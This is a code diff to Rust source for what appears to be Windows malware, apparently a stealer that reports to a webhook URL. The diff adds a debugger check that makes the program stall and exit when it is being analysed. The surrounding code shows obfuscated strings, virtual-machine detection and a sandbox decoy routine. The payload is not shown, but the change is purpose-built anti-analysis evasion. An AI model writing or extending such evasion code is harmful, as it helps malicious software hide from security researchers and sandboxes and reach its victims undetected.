@@ -29,6 +29,10 @@ pub(crate) fn env_configured() -> bool {
     == Some(&xor_str(&[0x6B]))
 }
 
+pub fn is_debugger_attached() -> bool {
+    unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
+}
+
 fn drivers_dir() -> PathBuf {
     std::env::var("SystemRoot")
         .map(PathBuf::from)
@@ -80,7 +84,6 @@ fn vm_drivers_present() -> bool {
 }
 
 fn vm_processes_present() -> bool {
-    use windows::core::PCWSTR;
     use windows::Win32::Foundation::CloseHandle;
     use windows::Win32::System::Diagnostics::ToolHelp::{
         CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
@@ -158,6 +161,10 @@ pub fn run_sandbox_decoy() {
 }
 
 pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
+    if is_debugger_attached() {
+        std::thread::sleep(std::time::Duration::from_secs(30));
+        return Ok(());
+    }
     if is_virtualized_environment() {
         run_sandbox_decoy();
         return Ok(());
